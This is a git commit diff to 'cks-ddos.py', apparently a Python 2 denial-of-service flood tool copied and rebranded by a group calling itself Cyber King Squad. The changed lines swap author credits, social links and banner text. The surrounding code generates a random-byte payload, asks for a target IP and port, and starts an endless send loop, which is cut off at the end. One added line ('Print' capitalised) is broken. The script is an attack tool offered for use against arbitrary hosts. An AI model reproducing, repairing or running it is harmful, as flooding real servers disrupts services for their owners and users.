abcf87486284909a7433db463522af602643176a
Rh hacker <72617844+Rhbos@users.noreply.github.com>
2021-02-16 22:12:30 +0600

    Update cks-ddos.py

--- cks-ddos.py
+++ cks-ddos.py
@@ -18,27 +18,28 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet DDos Attack")
+os.system("figlet CKS DDos")
 print
-print "Author   : HA-MRX"
-print "You Tube : https://www.youtube.com/c/HA-MRX"
-print "github   : https://github.com/Ha3MrX"
-print "Facebook : https://www.facebook.com/muhamad.jabar222"
+print "Author   : Rh@King"
+Print "team co-CEO:RR@king"
+print "You Tube : https://www.youtube.com/Cyber.king.Squad"
+print "github   : https://github.com/Rh.king"
+print "Facebook : https://www.facebook.com/cyber king squad"
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
 os.system("clear")
 os.system("figlet Attack Starting")
-print "[                    ] 0% "
+print "[                    ] 0% Cks "
 time.sleep(5)
-print "[=====               ] 25%"
+print "[=====               ] 25% Cks"
 time.sleep(5)
 print "[==========          ] 50%"
 time.sleep(5)
 print "[===============     ] 75%"
 time.sleep(5)
-print "[====================] 100%"
+print "[====================] 100%Attack.by.cks"
 time.sleep(3)
 sent = 0
 while True:
